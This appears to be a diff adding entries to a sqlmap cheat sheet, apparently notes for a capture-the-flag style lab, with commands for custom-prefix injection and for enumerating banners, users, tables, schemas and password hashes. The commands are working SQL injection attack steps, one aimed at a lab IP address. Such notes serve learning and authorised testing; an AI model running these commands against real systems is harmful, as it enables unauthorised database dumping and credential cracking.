@@ -7,7 +7,8 @@ sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
 # with specified columns
 sqlmap -u http://154.57.164.61:31255/case7.php?id=1 -p id --union-cols=5 -D testdb -T flag7 --batch --dump --no-cast
 
-
+# with specific prefix
+sqlmap -u "http://154.57.164.61:31255/case6.php?col=id" --prefix='`)' --no-cast --level=5 --risk=3 -D testdb -T flag6 --dump --batch
 ```
 
 ## HTTP Request Type
@@ -48,7 +49,30 @@ sqlmap -u "http://www.target.com/vuln.php?id=1" --batch --parse-errors
 sqlmap -u "http://www.target.com/vuln.php?id=1" --proxy="http://127.0.0.1:8080"
 ```
 
+# Basic Enumeration
 
+```bash
+# Basic DB enumeration
+sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
+
+# Table enumeration
+sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
+
+# Table/row enumeration
+sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
+
+# Conditional enumeration
+sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
+
+# Database schema enumeration
+sqlmap -u "http://www.example.com/?id=1" --schema
+
+# Searching for data
+sqlmap -u "http://www.example.com/?id=1" --search -T user
+
+# Password enumeration and cracking
+sqlmap -u "http://www.example.com/?id=1" --passwords --batch
+```
 # Advanced Tuning
 
 ```bash
